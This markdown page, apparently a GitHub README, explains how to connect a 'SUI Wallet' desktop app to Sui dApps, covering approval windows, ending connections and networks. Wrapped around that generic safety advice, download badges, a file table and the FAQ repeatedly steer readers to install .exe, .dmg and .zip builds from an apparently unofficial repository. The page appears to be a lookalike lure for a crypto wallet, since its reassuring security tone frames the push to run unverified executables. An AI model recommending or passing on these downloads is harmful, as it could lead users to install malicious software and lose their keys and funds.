![SUI Wallet](assets/banner-article.png)

# Connecting SUI Wallet to a dApp

Connecting shares your address; approving shares nothing until you sign.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Connecting a site shares the account's address and lets that site ask for signatures. It does not hand over
keys or funds, and it can be ended from the wallet whenever you like. Each request appears in a window that
names the site and the account it will act on, and declining costs nothing.

## What connecting shares

A connection is a permission to ask, not a permission to act. The site learns the address you chose and can send signature requests; it cannot move anything until you approve a specific request, which is why a connection is not the same as a transfer.

That distinction is the whole safety model of a connection, and it is easy to lose sight of when a page
says "connected" as though something had been transferred. Nothing has. What changed is that the site can
now put a request in front of you.

## The account the site will see

The wallet shows which account a site is using, which matters when you hold several. A site connected with the account you keep for experiments will keep using it until the connection is changed or ended, and the requests follow that account.

Sending the wrong account to a site is not a security failure, but it does publish an address you may not
have meant to publish, and it puts the site's requests against the wrong balance - which reads as a broken
dApp rather than a wrong selection.

## The approval window

Every request appears in a window that names the site and previews the transaction's effect in human-readable terms. That is the moment to read rather than to click, because the window is showing you what will happen rather than what the site says will happen.

Three questions, in this order: do I recognise this site, does the effect match what I asked for, and is the
account the right one? A "yes" to all three is an ordinary connection. A "no" to any of them is a reason to
close the window, and closing it does not disconnect the site or cost anything.
[Approving transactions in SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/approving-transactions-in-sui-wallet.md) covers the approval screen field by field.

## Ending a connection

A connection can be ended from the wallet, and ending it stops further requests from that site. It does not undo anything already signed: a transaction that was approved is done, and no disconnection reaches back into the chain behind it.

The practical habit is to end connections you are not using. A connection that lingers is a site that can
still put a prompt in front of you at a moment when you are not paying attention.

## When an approval looks unlike the site

The most common phishing shape against a connected wallet is a request that arrives while you are looking
at something else, or a preview whose effect is broader than the site described. Both are visible in the
window if it is read.

[Avoiding SUI Wallet phishing sites](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/avoiding-sui-wallet-phishing-sites.md) sets out the three things an attacker needs - a download, a
phrase or a signature - and a connection is only ever the third. That is why a connection is not dangerous
by itself and a signature always is.

## The wallet and the browser extension

A dApp built for a browser extension looks for an injected object in the page. A desktop application is not
that object, so "wallet not detected" is often a category error rather than a fault: the site is asking the
browser for something the desktop app does not put there.

The desktop app's connection flow is its own - the site-connect screen is part of the app, and it is where
the site's request arrives. If a dApp offers only an extension button, the honest answer is that this wallet
is a different shape of product, not that the install is broken.

## Networks

The diagnostics panel names the network the wallet is on, and a dApp expects a particular one. A site that
cannot see your balance, or shows zero, may simply be pointed at a different network than the one your funds
are on.

Check the panel before assuming the dApp is broken, and check it again after switching: an approval made on
the wrong network is still an approval.

## FAQ

### How do I connect SUI Wallet to a Sui dApp?

Open the dApp's connect option, choose this wallet in its list, and approve the connection in the app's
window. The approval names the site and the account, and it can be declined without consequence.

### Why does a dApp not detect my installed wallet?

Most dApps look for a browser extension rather than a desktop application. If the site offers only an
extension, it is asking for a different product; the app's own site-connect flow is the way in.

### How do I verify a dApp is genuine?

By the request rather than by the badge: the window names the site, and the preview shows what it wants to
do. A site can call itself verified; it cannot make an approval harmless.

### Can I switch networks?

The panel names the network you are on, and the selector changes it. A dApp generally expects one network,
so match it before connecting rather than after.

### Why does the dApp use the wrong account?

Because you connected with that account. The wallet shows which one a site is using; reconnect with the
right one, or end the connection and start again.

### Why does it not work with a dApp on Windows and Chrome?

Because Chrome-era dApps are usually written for an extension. Nothing about Windows makes the desktop app
incompatible; the site is looking for a different kind of wallet. Install the current release from the
[release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) before
concluding it is a version problem.
